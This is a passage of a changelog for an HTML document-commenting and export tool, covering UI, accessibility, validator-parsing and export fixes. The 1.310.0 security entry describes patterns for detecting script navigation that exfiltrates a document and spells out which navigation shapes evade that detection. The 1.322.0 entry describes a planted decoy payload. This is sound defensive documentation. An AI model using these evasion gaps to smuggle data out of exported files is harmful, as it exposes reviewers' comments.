  rather than pushing the actions row past the bottom edge. (`CMH-CORE-18`)

## [1.326.0] - 2026-08-02

### Fixed

- A floating control (the hover bubble, the **Add Comment** buttons, the whole-diagram button) is
  now bounded by the intersection of EVERY clipping container around its target, not just the
  nearest one. A diagram host inside a scrolling table wrapper, inside a `figure.chart`, or inside
  a raw diff block is itself clipped by that outer box, so a target the outer box has scrolled out
  of view now hides the control instead of leaving it floating over unrelated content, and a target
  that is only partly visible clamps the control to the visible intersection. Previously the
  resolver honoured only the first matching ancestor, so the inner box shadowed the outer scroller.
  Only a container that genuinely clips takes part, so a recognised box an author left
  `overflow: visible` (or a `display: contents` one, which generates no box at all) no longer bounds
  a control anchored to content that plainly spills out of it.

## [1.325.0] - 2026-08-02

### Added

- `Clear all comments` now also lives in the floating toolbar's overflow (`...`) menu, grouped right
  after `Manage storage`, so a reviewer working with the comments panel hidden can clear without
  re-opening the panel. It is a second ENTRY POINT, not a second implementation: both the toolbar and
  sidebar items bind to one handler, so the confirmation text, the nothing-to-clear guard, and the
  reset semantics (comments, notes, checklist, widget layout, open editors and popovers) are
  identical. Focus returns to the trigger of whichever menu was opened, and the toolbar count pill
  and portability badge refresh afterwards.

### Fixed

- Both `Clear all comments` items now advertise the empty state instead of looking available and
  doing nothing: while no comment, note, checklist, or layout change is pending they are
  `aria-disabled`, dimmed, and carry a `Nothing to clear...` tooltip, exactly as `Copy all` does.
- Activating `Clear all comments` with nothing to clear no longer drops keyboard focus to the page
  body. The owning menu still closes on the click, but no confirmation dialog opens to restore
  focus, so the handler now returns focus to that menu's trigger itself.
- Both `Clear all comments` items take their accessible name from their visible label instead of an
  `aria-label="Clear Comments"` override, so a screen reader announces (and a voice-control user can
  speak) the same name that is printed on the destructive control.

## [1.322.0] - 2026-08-02

### Fixed

- Export Offline no longer trusts the first `cmhVendoredRichLibs` block it finds, and never ships a
  library without its MIT notice. The payload is INFRASTRUCTURE, so it is now resolved from the
  document being exported as a payload-id script OUTSIDE the content root and EXACTLY one of them:
  an authored decoy planted inside the content region used to come first in document order and win,
  and its compressed bytes were inflated and inlined into an export whose own CSP allows inline
  script - document-supplied code running in a file the recipient believes is a clean
  skill-generated export. A document that has a candidate but cannot single one out (two of them, or
  a content boundary that cannot be pinned down because the content-root id is missing or
  duplicated) is now a loud, distinct failure rather than "no payload", so it cannot quietly hand
  the export to the document's own copies. The authoring step collapses a rich document to exactly
  one payload copy, so a finalized document is never born in that state. The consume-and-strip also
  removed only the FIRST payload block, leaving a second one - including one parked in a
  `<template>` - inside a file that is supposed to carry the libraries inline and no payload at all;
  every infrastructure block is now stripped, while a payload-id script inside the content root is
  preserved as the authored content it is (and no longer exempt from the network-import strip).
  Finally, a library and its notice travel as ONE unit: a payload whose notice text had been
  stripped, or replaced by a non-string value, used to re-emit the library bytes with no notice at
  all - a silent MIT compliance break - and now fails the export naming the missing NOTICE and the
  remedy rather than a bundle the document does carry.
## [1.321.0] - 2026-08-02

### Fixed

- `tools/blocks/chart_block.py` no longer raises `TypeError` when a cached `sys.modules["validate"]`
  carries a `__file__` that is not a usable path. Its containment guard now normalizes the value
  through `os.fspath` and refuses anything that is not a non-empty string - a plain object, an int,
  bytes, a `PathLike` whose `__fspath__` returns bytes or raises, or a `str` subclass with a hostile
  `__bool__` - and the refusal message no longer raises while rendering an odd value (a tuple, or one
  whose `__str__` raises). A path that cannot be canonicalized at all (an embedded NUL byte, an
  over-long path) is refused the same way, as is a cached module whose `__file__` ACCESS raises (a
  lazy loader or an import proxy), and the "unexpected result" reason now renders a misbehaving
  validator's own value without letting its `__repr__` raise.
  So that install shape comes back as the named "could not check" reason the fail-closed path exists
  for - and the `--allow-unvalidated-output` opt-out stays reachable - instead of escaping as a
  traceback from outside the caller's try block. `tools/authoring/new_document.py` carried the same
  seam and gets the identical hardening, so the two stay in parity.

## [1.317.0] - 2026-08-02

### Added

- An authored inline `<svg>` figure is now commentable media, exactly like an `<img>` or a chart
  canvas. Hovering it (or focusing it and pressing Enter) reveals the pinned **Add Comment**
  button, the saved comment rings the graphic and lists an `image N` card, and it survives reload,
  **Copy all**, **Export as Portable**, and delete like any image comment. The quote and alt come
  from the svg's `aria-labelledby`, `aria-label` or a direct-child `<title>`, and an svg that is
  chart media pins `chart N` like a chart canvas. Previously an inline SVG - the shape the skill
  itself emits when asked for an inline SVG image - had no comment affordance at all, so a figure
  was silently uncommentable while every other block was commentable.
- SVG that the runtime or another layer owns stays inert, so no chrome grows an affordance:
  anything under `.cm-skip`, anything under an `aria-hidden="true"` element, a graphic marked
  `role="presentation"`/`role="none"`, an icon beside text in a link or inside a
  button/summary/label/`[role=button]`-style control (a link that wraps ONLY the figure keeps it
  commentable, matching a linked `<img>`), a rendered mermaid or diff surface, a definitions-only
  sprite sheet (`<defs>`/`<symbol>`, zero width/height, `hidden` or `display:none`), an svg whose
  labelled parts the widget layer already owns, and an inner `<svg>` nested inside another one.
- A commentable svg with no author name is given `role="img"` and an affordance `aria-label` so it
  is never a nameless focus stop; that synthesized label is marked `data-cm-img-auto-label` and
  never becomes the comment's anchor metadata (only the exact synthesized string is discounted, so
  a forged marker cannot hide a real name).
- `examples/report-metrics.html` ships the behavior live: a plain inline SVG "capacity headroom"
  figure now sits beside the labeled-parts diagram, so the two SVG review models can be compared
  in one place.

### Changed

- Inline SVG figures now take part in the media index, so `imageIndex` numbering shifts in a
  document that contains one. Comments recover through their stored metadata, but an UNLABELED
  image or chart canvas has none to recover by, so label every commentable graphic (`aria-label`,
  `aria-labelledby` or a direct-child `<title>`) - an unlabeled one may need re-anchoring after
  the runtime is upgraded in place under an existing comment key.

### Fixed

- An image comment can no longer be re-anchored to an ambiguous or wrong target. A STORED but
  empty `imageSrc` now counts as metadata rather than "no opinion" (an inline svg never has a
  src, so the empty slot is what distinguishes it from an `<img>`), and the metadata fallback in
  `resolveImageEl()` accepts a match only when exactly ONE candidate matches - mirroring the
  source-only fallback's existing uniqueness guard - instead of taking the first.
- Media metadata is made inert where it is WRITTEN: an alt/label is now stripped of bidi controls
  and every line separator (including U+0085) before it is stored, so no consumer can reintroduce
  a bundle-line or direction-override injection by forgetting to re-sanitize it.

## [1.316.0] - 2026-08-02

### Changed

- Exported HTML now always keeps the authoring session provenance, and the `Keep AI session id in
  exports` checkbox is gone from both the toolbar overflow menu and the sidebar Export menu. The
  `commentable-html-session-id` and `commentable-html-agent` meta tags survive every Portable,
  Offline, and Plain HTML export unconditionally. The session id is an opaque agent session
  identifier the authoring tools already stamp by default and the footer already offers to copy, not
  a secret, so stripping it by default bought almost nothing while it cost a row in the most
  space-constrained menu and silently dropped authoring provenance from the copy a reviewer actually
  receives - the copy where knowing which agent session produced the document is most useful. The
  now-dead strip path in the export runtime is removed with it.

## [1.315.0] - 2026-08-02

### Fixed

- The in-document comment dialog no longer swallows the reviewer's first click on a control of an
  editor that is open alongside it. The dialog's dismiss handler swallows any outside pointer click
  (capture-phase `preventDefault` + `stopPropagation`) so it cannot follow a link the highlight sits
  on, but the side pane's inline reply/edit editor and the floating composer both stay open when the
  dialog opens, so the first click on their formatting, Save, or Cancel buttons did nothing and had
  to be repeated. Both are now carved out. Every other outside click is unchanged, including the
  keyboard-activated (`detail === 0`) case and the mid-edit case where the dialog stays open.
- The whole guard is now resolved by IDENTITY against the layer's own state - the one active inline
  editor, the composers the layer opened, and the live dialog element - rather than by matching
  `cm-` class names. The annotated document is author content, so a class match let content in the
  document spoof its way out of the swallow; the "the click landed inside the dialog" test had the
  same hole, where a spoofing element left the real dialog open AND let the click act. Document
  content carrying either class name is now swallowed like any other outside click.
- The export-intent toast no longer re-derives the dialog's swallow condition. It asks the dialog's
  own predicate, so the announcement can never disagree with whether the export click runs. That
  predicate keys on the dismiss listener being ARMED (it is registered a tick after the dialog
  opens), not merely on the dialog existing, so the two windows where nothing is swallowed - the
  pre-registration tick and a mid-edit dialog - now announce the export that does run instead of
  suppressing it.

## [1.310.0] - 2026-08-02

### Security

- The Offline export no longer leaves top-level navigation as an open exfiltration channel, and
  states exactly what it can and cannot promise. The zero-network CSP blocks every subresource
  path, but no policy delivered in a `<meta>` can restrict where a script NAVIGATES the document
  (`navigate-to` was dropped from CSP Level 3 and ships in no browser; `sandbox` is ignored in a
  meta-delivered policy), so an inline script the export deliberately preserves could beacon the
  whole document - every reviewer comment with it - by assigning `location.href`. The loader strip
  now removes a runnable inline script that carries a direct scripted navigation to a network URL
  literal (a `location.href` assignment, a `location.assign` or `.replace` call, an assignment to a
  prefixed or statement-position `location`, or a prefixed `open(` call, reached through a
  repeatable chain of the global prefixes `window`, `self`, `top`, `parent`, `globalThis`,
  `document` and `frames`), exactly as it already
  removed one carrying a remote dynamic module load, and the strict validator applies the identical
  pattern so a hand-authored offline file with that shape is no longer certified offline-clean.
  When the export drops a script, it now says so in the download toast instead of removing it
  silently.
- Offline exports now carry `<meta name="referrer" content="no-referrer">` (replacing any authored
  referrer meta, since the last one declared wins) and drop per-element `referrerpolicy`
  attributes, so a navigation that still happens - a reader clicking an authored link - leaks no
  referrer.
- The residual is documented rather than implied away, in BOTH directions. The strip reads raw
  source for a literal shape, so it misses an aliased sink (`var l = location; l.href = ...`),
  computed access, a URL assembled at runtime, a bare unprefixed `open(...)`, a bare `location =`
  that does not follow a statement delimiter, anything inside a script carrying one of the four
  reserved ids the strip skips, and any other navigation sink (a synthesized anchor click, a
  script-injected refresh meta). In the other direction it removes any preserved script that
  navigates to a network URL literal at all - an intentional SSO redirect or help popup included -
  and over-matches a script whose comment or string merely spells one of those shapes. See the
  CMH-OFFLINE-05 spec row, which also records why per-script hashes were rejected as a fix.

## [1.297.0] - 2026-08-02

### Fixed

- A floating diagram control now stays clipped to a standalone `div.mermaid` host exactly as it
  does to a `pre.mermaid` one. The clip/scroll container fallback that positions the floating
  `Add Comment` / `Comment on diagram` buttons and the highlight bubble re-typed its container list
  and named only `pre.mermaid`, so in a document that authors its diagrams as `div.mermaid` - a
  shape the runtime indexes as a diagram host everywhere else - the button escaped the host's
  clipping box and floated over unrelated content. The recognised containers (both the
  `.cmh-diagram-gallery` card shapes and the generic fallback) are now DERIVED from the shared
  `CMH_MERMAID_SEL` / `CMH_CHART_FIGURE_SEL` vocabulary through one normalized token list, and a
  guard pins that derivation, so the clip layer can no longer drift from the vocabulary the rest of
  the runtime uses.
- An unstyled `div.mermaid` host is now the same scrolling box as a `pre.mermaid` one. The layer's
  stylesheet gave only `pre.mermaid` the `overflow-x: auto` box, the `svg { max-width: none }`
  reset, the scroll-fade edge cue, and the mobile wide-diagram min-width - even though the runtime
  indexes both host shapes and toggles those very classes on both. A document that authors its
  diagrams as `div.mermaid` therefore had no scroll box for a wide diagram, and no clipping box for
  the floating controls above to clamp to.

## [1.295.0] - 2026-08-02

### Changed

- The comment formatting toolbar is now a proper ARIA `role="toolbar"` with a roving `tabindex`, so
  the seven buttons are ONE tab stop instead of seven on every surface that carries it (the floating
  composer, the side-pane reply/edit editors, and the in-document comment dialog). Left/Right move
  focus inside the bar and carry the tab stop with them (wrapping at both ends), and Home/End jump to
  the ends. The keys are consumed
  on the bar, so an arrow never reaches a document-level handler, and arrow keys inside the textarea
  still move the caret. Clicking, the Ctrl/Cmd shortcuts, and the mousedown selection retention are
  unchanged. Previously, opening a reply or an edit in the narrow side pane inserted seven tab stops
  in front of the textarea.
- The floating composer's Ctrl/Cmd+B/I/U/K, Ctrl/Cmd+Enter (save) and Escape (cancel) keys now work
  from a focused toolbar button as well as from the textarea, because they are bound to the composer
  rather than to the textarea (the side pane and the in-document dialog already did this). Escape now
  closes only the composer it was pressed in - it can no longer also discard a second open composer's
  draft - and an open
  toolbar or sidebar menu still outranks the composer, so Escape dismisses the menu first and leaves
  the draft behind it intact.
- The floating composer's toolbar buttons now keep the repo-wide `>=44px` touch target on a phone
  viewport (they wrap to a second row inside the composer rather than overflowing), matching the
  side-pane and in-document toolbars. The composer was the last surface still rendering roughly
  30x22px buttons on a phone.
- The Help panel's "Formatting your comment" topic documents the toolbar's single tab stop and its
  arrow-key navigation.

## [1.293.0] - 2026-08-02

### Fixed

- A side-pane reply or edit draft that survives a sidebar re-render (sorting, a note-typing
  debounce, a checklist change) now keeps its SELECTION, not just its text. The panel's inline
  editor carries the formatting toolbar, so a re-render that landed between selecting a word and
  clicking Bold used to collapse the caret to the end of the draft and append bare `****` instead
  of wrapping the word. The draft snapshot now records `selectionStart`/`selectionEnd` (and the
  selection direction) and the re-opened editor restores that range. Re-clicking the edit action on
  an editor that is already open now only re-focuses it, keeping the live selection and its anchor
  direction instead of collapsing to the end.

## [1.292.0] - 2026-08-02

### Fixed

- Re-exporting an offline file whose inlined library carries no MIT notice now says what actually
  happened. The `data-cmh-offline-lib` marker predates the MIT notice comment, so an offline file
  produced by an exporter version in between carries the library WITHOUT a notice, and
  `Export Offline` correctly refuses to re-emit it (redistributing an MIT-licensed library without
  its notice is a licence violation). It reported that refusal as
  `Offline export is missing the vendored mermaid bundle.`, which is misleading - the bundle is
  right there in the file. The error now names the real cause (the inlined copy has no MIT license
  notice beside it) and the action that works (re-export from the source document that still carries
  the vendored payload). It claims that cause only when licensing was the SOLE blocker
  (a copy the content gates rejected keeps the generic message, since the licence is then not a
  proven cause) and only for the library that could not be re-emitted, and it asserts nothing it
  cannot verify - the gates authenticate no provenance, so it never claims who wrote the file. The
  notice is still never synthesised: with the payload consumed there is no licence text to emit,
  which is exactly why the copy is refused. Because an Offline export failure names a cause and an
  action, every one of those toasts is now announced assertively and stays on screen long enough to
  read instead of using the 3s confirmation toast.

## [1.291.0] - 2026-08-02

### Fixed

- `tools/authoring/new_document.py` no longer writes a document it could not self-validate. Its
  `_self_validate` returned `(None, None)` when the sibling `validate` module was unimportable;
  `main()` unpacked that into errors/warnings, `if errors:` was falsy, and the new document was
  written UNVALIDATED - so the one self-check the generator has disappeared exactly on the broken
  or partial install it exists for. It now fails CLOSED by default: nothing reaches `--out` or
  stdout and it exits non-zero naming the actual cause. The seam is hardened the same way
  `chart_block.py` was: a `validate` module resolved from outside this skill's own tools dir is
  refused BEFORE its module body runs (compared canonically, so a junction or a differently-cased
  path does not false-alarm), and a crashing validator or an unexpected return shape (notably
  `(None, None)`, which would otherwise read as "no errors, no warnings") counts as "could not
  check" rather than escaping as a traceback. A caller who knowingly accepts unchecked output
  passes the new `--allow-unvalidated-output`, which writes it with a warning; that flag never
  suppresses a real validation failure.


## [1.285.0] - 2026-08-02

### Added

- The in-document comment dialog (the one you get by clicking a highlight) now offers the same
  rich-text editing as the floating composer and the side panel. Its Edit form carries the shared
  formatting toolbar (bold, italic, underline, strikethrough, inline code, link, bullet list) above
  the textarea, and Ctrl/Cmd+B/I/U/K apply the matching formatting - from the textarea and from a
  focused toolbar, Cancel, or Save button, since the keys are bound to the editor and action
  containers rather than the textarea. Ctrl/Cmd+Enter still saves
  and Escape still cancels back to the rendered note with the dialog left open; a blank save still
  marks the field invalid, and formatting (not just typing) now clears that state. Mid-IME-composition
  the toolbar, save, and cancel are all inert, so a candidate window can never splice markers into
  provisional text or discard the draft. The toolbar is tightened to fit the fixed-width dialog on one
  row, and keeps a >=44px touch target on phones (wrapping rather than overflowing).
## [1.282.0] - 2026-08-02

### Fixed

- The validator's two tolerant parsers now share ONE set of element boundaries, so a document
  reads the same whichever check is asking and whichever Python is running. The `<pre>`/`<code>`
  tokenizer already drew the boundary a browser draws; the DOCUMENT parser - the view the chart,
  link, id, heading, meta, anchor, `<style>`/`<script>` and content-region checks all read - still
  inherited whatever tables the host `html.parser` shipped, so the same file could be two
  different documents. Both now derive from a shared `_BrowserBoundaries` base: every HTML
  raw-text / RCDATA element (`script`, `style`, `textarea`, `title`, `xmp`, `iframe`, `noembed`,
  `noframes`, `noscript`) holds TEXT, a raw-text element closes on `</name` followed by
  whitespace, `/` or `>` (`</script data-x>`, `</script/>`), a comment closes at `-->`, `--!>`
  and the abrupt `<!-->` / `<!--->` but never at `-- >`, an unterminated comment consumes the
  rest of the document, and `<![CDATA[ ... ]]>` is a section only inside `svg`/`math` content
  (elsewhere it is a bogus comment ending at the first `>`, so the markup after it is live).
- Concretely: a `<canvas>`, an `<a href target>`, an `id` or a heading quoted inside a
  `<textarea>`, a `<title>` or a `<noscript>` is prose a reader SEES, so it no longer raises
  chart errors ("no renderer was found", "not inside a cm-skip wrapper") or a same-tab link
  warning on a clean document; markup a browser keeps LIVE after a `--!>` close, after a
  `</script data-x>` closer or after a `<![CDATA[` opener is no longer silently skipped; and
  markup a browser hides (behind `-- >`, inside an unterminated comment, inside a real CDATA
  section in foreign content) is no longer resurrected. Python 3.12 and 3.13+ now agree.
- The same shared boundary layer closes several smaller cross-version and tree-construction gaps:
  `<plaintext>` swallows the rest of the document exactly as a browser does (even past a
  `</plaintext>` that looks like a closer), a tag name folds ASCII-case-insensitively only (so
  `</\u017fcript>` does not end a `<script>`), the host's RCDATA character-reference decoding is
  no longer inherited (3.13 decoded inside `<title>`/`<textarea>`, 3.12 did not), a self-closed
  foreign element such as `<svg><rect id="x"/>` is recorded as the element it is and never left
  open, a self-closed void tag such as `<hr/>` closes an open `<p>` in both parsers, the implicit
  `</p>` / `</li>` close respects HTML5 scope across an `<svg><foreignObject>` (while an HTML
  element merely NAMED `<desc>` still stops nothing), and the marker scan blanks every raw-text
  body, so a region marker quoted in a `<textarea>` or the print `<noscript>` is not a boundary.

## [1.280.0] - 2026-08-01

### Fixed

- A `div.mermaid` diagram is now constrained when printing or saving to PDF, exactly like a
  `pre.mermaid` one. The printable-height cap (8.4in, so a tall diagram scales to fit one page
  instead of overflowing or splitting across a break) was scoped to `pre.mermaid svg`, while the
  runtime renders diagrams into BOTH `pre.mermaid` and `div.mermaid`. A document that authored its
  diagrams as `div.mermaid` therefore printed an unconstrained SVG that could run off the page.
  The cap lives in two surfaces that must agree - the `@media print` stylesheet and the
  `measureCss()` string used to measure single-page height - and BOTH omitted the host.
- `measureCss()` no longer re-types the diagram vocabulary: it DERIVES its mermaid hosts from the
  shared `CMH_MERMAID_SEL` definition. The print stylesheet is plain CSS and cannot reference a
  constant, so it still spells the hosts out, but it is now PINNED two-directionally to that same
  definition - so neither PRINT surface can drift back to covering half the hosts.

## [1.279.0] - 2026-07-30

### Fixed

- Validator checks about the LAYER can no longer be answered by text an author or a REVIEWER
  supplied. Each now asks its question of the right SOURCE instead of the raw document string.
  The scoped `.cm-skip[hidden]` rule check, the `--cp-bg:` theme-declaration check and the
  unscoped `[hidden] { display: none }` warning read real parsed `<style>` bodies with CSS
  comments blanked, because text is not a stylesheet and a commented-out declaration is not a
  declaration. Previously a document that DOCUMENTS commentable-html could forge the verdict from
  its own prose: quoting the scoped rule or `--cp-bg:` SATISFIED a real check, so a document with
  no theme variables at all passed the ERROR by merely talking about them, while a code sample
  SHOWING the unscoped rule raised a warning the author could only clear by rewording their
  content. A `<style>` an author puts in their own content still counts, since it really would
  style or hide the page, and an unclosed `<style>` - which a browser runs to end of file - is
  now flushed by the parser instead of escaping the scan entirely. Each `<style>` is read
  as its own stylesheet, exactly as a browser parses it, so an unterminated comment in one
  can no longer hide a live unscoped reset in a later one; a `<style>` whose `type` is not
  a CSS type renders nothing and no longer counts; and a quoted string VALUE such as
  `content: ".cm-skip[hidden] --cp-bg: x"` is not a selector or a declaration, so it can
  no longer satisfy either check.
- The retired `--START-COMMENTS-EXPORT--` marker check, which is about markup rather than CSS,
  now reads an ALLOW-list of the layer's own CSS, COMMENT UI and JS regions. A deny-list could not
  be made safe: user text reaches `<title>`, `data-doc-label` and every other attribute -
  `new_document --label` copies the label verbatim into two of them, so naming a document after
  the retired marker raised a warning the author could only clear by renaming it - and the
  HANDLED IDS and EMBEDDED COMMENTS regions exist precisely to carry user text (a reviewer's
  comment bodies, the reviewed-section headings an export bakes in), so they are state containers
  and are never inspected.
- The CONTENT and region markers are now counted and located in one shared view whose
  `<script>`/`<style>` bodies are blanked and whose comments survive (the markers ARE comments),
  so the marker check and the layer checks can never disagree about what a marker is: a marker
  quoted in script data neither forges a duplicate-marker error nor defines a boundary. That
  scan takes its raw-text boundaries from the same tokenizer the code-block checks use, so a
  `<script` named inside a comment never opens a region that swallows a marker.

## [1.278.0] - 2026-07-30

### Added

- Replying to a comment or editing a comment or reply in the side pane now offers the SAME
  rich-text editing as writing a new comment: the inline editor carries the formatting toolbar
  (bold, italic, underline, strikethrough, inline code, link, bullet list) above its textarea, and
  Ctrl/Cmd+B/I/U/K apply the matching markers to the selection. The notes always RENDERED rich, but
  the markers were undiscoverable exactly where most follow-up writing happens. The floating
  new-comment composer and the side pane now build the toolbar and the shortcuts from one shared
  source (`noteFormatBarHtml` / `wireNoteFormatBar` / `handleNoteFormatShortcut`), so the two
  surfaces cannot drift apart.

### Fixed

- The side-pane inline reply/edit editor's key handling now lives on the editor wrapper rather than
  its textarea, so Ctrl/Cmd+Enter, Esc, and the formatting shortcuts also work while focus is on one
  of the editor's buttons. Previously Esc pressed there fell through to the document handler, which
  would discard an unrelated open composer's draft while leaving the inline editor open.
- The side-pane inline editor now clears the blank-note invalid state (`aria-invalid` and the red
  border) as soon as the reviewer types or formats, matching the floating composer; it used to stay
  marked invalid until the editor closed.
- A formatting-toolbar click during an IME composition is ignored on both surfaces, so markers can no
  longer be spliced into provisional (for example CJK candidate) text. The same tracked composition
  state also guards each editor's save and cancel keys, so Ctrl/Cmd+Enter and Esc stay inert
  mid-composition even on an engine that reports the keydown with `isComposing` already false.

## [1.276.0] - 2026-07-29

### Fixed

- The two author-time scans that locate code blocks - the syntax-highlighting guardrail
  (CMH-VAL-11) and the runnable-KQL rule (CMH-KQL-08) - now read PARSED elements instead of
  matching text over a masked copy of the document. The mask closed the two real defects it was
  built for, but a text scan still drew the block boundary in four places a browser does not, and
  each one could hide a real raw block from a guardrail that exists to catch it:
  - every HTML raw-text / RCDATA element holds text, not markup, yet only `<script>` and `<style>`
    were treated that way. A `<pre>`/`<code>` written inside a `<textarea>`, `<title>`, `<xmp>`,
    `<iframe>`, `<noembed>`, `<noframes>` or `<noscript>` was read as authored markup, and its
    unpaired opener could swallow the author's real block that followed;
  - a `<![CDATA[ ... ]]>` section in foreign content (`<svg>`/`<math>`) is a declaration whose
    content is character data, so a block quoted there was both flagged on its own and able to hide
    a later real one;
  - the legacy comment close `--!>` was not recognized, so a comment ending that way stayed "open"
    to the document's next `-->` - which the layer always supplies - blanking every authored block
    in between;
  - matching attributes up to the first `>` ended a tag inside a QUOTED attribute value, so
    `<code title="a > b" class="language-python">` lost its language label entirely and a
    `data-cmh-kql-no-cluster` marker written after such a value was invisible.

  All four now fall out of a shared tolerant tokenizer (`checks/parsing.code_block_spans`), which
  records the offsets of every real `<pre>`/`<code>` element; the `figure.cmh-kql` exemption comes
  from real ancestry (matched case-insensitively) and the no-cluster marker from parsed attributes.
  Because the host interpreter's own rules differ, every boundary is applied explicitly rather than
  inherited, so the same document validates identically on every Python the skill runs on: the
  raw-text set; the raw-text closer (`</script data-x>`, `</script/>`, which only Python 3.13+
  honours); the comment closes (`-->`, `--!>`, `<!-->`, `<!--->` - and NOT `-- >`, which the
  pre-3.13 delegate wrongly accepted); an unterminated comment running to the end of the document
  rather than resuming after the next `>`;   and CDATA, which is a section only when the CURRENT NODE is a foreign (`<svg>`/`<math>`)
  element - under an HTML integration point (`foreignObject`, `desc`, `title`, an
  `annotation-xml` with an HTML `encoding`, or a MathML text integration point) or after an HTML
  breakout start tag such as `<p>` or `<div>`, which pops the open foreign elements, it is a
  bogus comment ending at the first `>`, exactly as it is in ordinary HTML. Payloads are still
  sliced from the
  ORIGINAL document, so the language, the emptiness test and the highlight classification are
  decided on the bytes that ship, and the fail-closed warning for a code block whose structure a raw
  `<script>`/`<style>`/`<!--` destroyed is unchanged. If the parse itself fails, no blocks are
  reported at all and both checks refuse the document instead of passing it on an empty result.

## [1.275.0] - 2026-07-29

### Fixed

- The Offline export's two script strips now treat every executable JavaScript MIME type as
  runnable, not only the modern three. `_stripOfflineRichRenderers` and `_stripOfflineNetworkLoads`
  returned early for any `type` outside empty / `module` / `text/javascript` /
  `application/javascript`, but a browser also executes `text/ecmascript`, `application/ecmascript`,
  `application/x-javascript`, `text/x-javascript`, `text/jscript`, `text/livescript`, and
  `text/javascript1.0` through `1.5` - so a script carrying one of those types kept its remote
  dynamic import, and a stale mermaid or Chart.js loader shim survived the renderer strip. Both
  strips now share the one runnable-script-type predicate the evidence scan already used. The
  strict validator carried the same narrow set in its own independent Python copy, so such a file
  also passed `validate.py --strict` as offline-clean; it now mirrors the runtime predicate, and a
  parity test pins the two implementations together in both directions. The zero-network CSP
  blocked the fetch either way, so this is defense in depth; the strip is the primary guarantee and
  no longer leans on the CSP.
- Re-running `Export Offline` on an already-offline document that contains a mermaid diagram (or a
  chart the built-in renderer does not draw) now produces a working download instead of an
  "Offline export is missing the vendored mermaid bundle" error toast. An Offline export consumes
  the vendored payload and removes it, so the file it produces carries the libraries inline and no
  payload at all; the exporter now reads those already-inlined copies and their MIT notices before
  the strip removes them and re-emits them, so a re-export reuses what is already local. Because
  re-emitting a captured script grants it execution and the document being exported is untrusted,
  the `data-cmh-offline-lib` marker alone is not taken as proof this exporter wrote it: a captured
  copy must sit in the head, carry exactly the attribute shape the exporter emits (which rules out
  `src`, any `type` - so inert data and a non-executing MIME-parameter type are never promoted to
  code - and `nomodule`, whose body never ran), pass the same network-import check the loader strip
  applies to every other surviving script, and carry no byte sequence that would open a script-data
  escape. An adjacent MIT notice naming the same library is required as a licensing condition, so
  the library and its notice always travel together. A document that has neither a payload nor a
  qualifying inlined copy still fails loudly.
## [1.273.0] - 2026-07-29

### Fixed

- The live chart renderer, the comment layer, and the Offline export no longer disagree about
  what a chart is. A bare data-bearing canvas (`data-cmh-chart-points` or
  `data-cmh-chart-source` with no `cmh-chart` class and no `figure.chart` wrapper) drew nothing
  at load - only a window resize revived it - was not commentable, and was invisible to the
  Offline export, so a document that attached its own Chart.js to such a canvas exported without
  the library and showed an empty canvas. It now draws at load, is commentable like any other
  chart canvas, and the export recognises it, so the evidence-based Chart.js decision applies to
  it too: the library travels only when the document actually needs it.

### Changed

- The chart and diagram selectors are declared ONCE, in a new `assets/js/03-selectors.js`
  module, and the renderer, the image comment layer, the mermaid layer, the Offline exporter,
  and the author-time rich-libraries payload detector all derive from it, so the lists can no
  longer drift. The detector's former deliberate superset (any `data-cmh-chart*` attribute) is
  now exact parity with the runtime.

## [1.271.0] - 2026-07-29

### Fixed

- The validator no longer classifies a document as NonPortable because its own authored CONTENT
  demonstrates the companion markup. It decided the mode by looking for a
  `<link href="commentable-html.css">` / `<script src="commentable-html.js">` ANYWHERE in the
  file, so a genuinely self-contained Portable document about commentable-html - one that quotes
  the legacy loading markup in prose, which `to_portable.py` now deliberately preserves when it
  migrates such a file - failed validation with `commentableHtmlLayer.mode must be "nonportable"`,
  no runtime script found, a missing `#cmhAssetBanner`, and a companion file that does not exist.
  The mode determination and every check that follows from it now read the LAYER's own markup:
  the authored region is excluded, because the layer's references always sit outside it (the
  stylesheet in `<head>` before it, the runtime scripts at the end of `<body>` after it). The
  region comes from the PARSE, not from marker offsets in the text, so it is exactly the region a
  browser would agree on - real comment markers, inside the live `#commentRoot`, outside an inert
  `<template>`, never inside CDATA - and a misplaced marker or a `<style>` straddling one cannot
  steer the validator into ignoring the real layer instead. It holds in the other direction too:
  an authored demonstration can never STAND IN for a real reference, so a NonPortable document
  whose bootstrap banner, watchdog, version meta, or companion reference exists only inside its
  prose still reports the same error it always did, and a real NonPortable document is classified
  and checked exactly as before. Because the layer view is only as trustworthy as the region it is
  derived from, the validator also errors when the CONTENT markers are present in the text exactly
  once each and in order but the document does not parse with a well-formed region - a marker
  swallowed by a `<script>`/`<style>` body or an inert `<template>`, a marker outside
  `#commentRoot`, or unbalanced markup closing `#commentRoot` mid-region - instead of guessing
  which side of the broken boundary the markup after it belongs to.

## [1.270.0] - 2026-07-29

### Fixed

- `tools/blocks/chart_block.py` no longer prints chart fragments it could not check. The tool's one
  promise is that what it emits validates, and it self-validates before printing - but when the
  sibling `validate` module could not be imported (a broken or partial install) the self-check
  returned "unknown", which the CLI read as success and printed the fragments anyway. So the single
  protection disappeared exactly on the installs where something was already wrong. It now fails
  closed for every "could not check" shape - an unimportable validator, a partial install where
  `validate.py` is present but one of its own dependencies is not, a truncated `validate.py` that
  raises on import, a `validate` module resolved from outside the skill's own tools directory
  (refused before its module body runs), a missing or corrupt validation template, a validator that
  crashes, and a validator that answers in an unexpected shape - writing nothing and naming the
  actual cause. A caller who knowingly wants unchecked output passes the new
  `--allow-unvalidated-output`, which emits the fragments with a warning on stderr; it never
  suppresses a real validation failure, and the CMH-VAL-18 advisory split still applies.

## [1.269.0] - 2026-07-29

### Fixed

- The author-time syntax-highlighting guardrail is no longer blind in a Portable document. The
  check scanned the whole file for `<pre>` blocks, so in a Portable document - which inlines the
  layer CSS and JS, both full of prose mentioning `<pre>` and `<code>` - a match starting inside
  one of those bodies swallowed the author's real code block and the check reported nothing at
  all. A raw `language-XXX` block therefore shipped unhighlighted with no warning, and
  `retrofit.py --no-highlight` exited 0 instead of failing closed. Blocks are now LOCATED in a
  masked view of the document (`<script>`/`<style>` bodies and HTML comments blanked to
  same-length spaces) and every payload is read from the original bytes, so the language,
  emptiness and highlight state are still decided on what actually ships. The mask is one
  left-to-right pass over an alternation, so a `<script` named inside a comment cannot open a
  mask that runs to the document's next real `</script>` - the same one-pass masking now backs
  the KQL runnable scan, which had that hole too.

### Changed

- Validator warnings now have one shared fatal/advisory split (`validate.ADVISORY_PREFIXES`,
  `is_advisory()`, `partition_warnings()`), honoured by `retrofit.py`, `content_replace.py`,
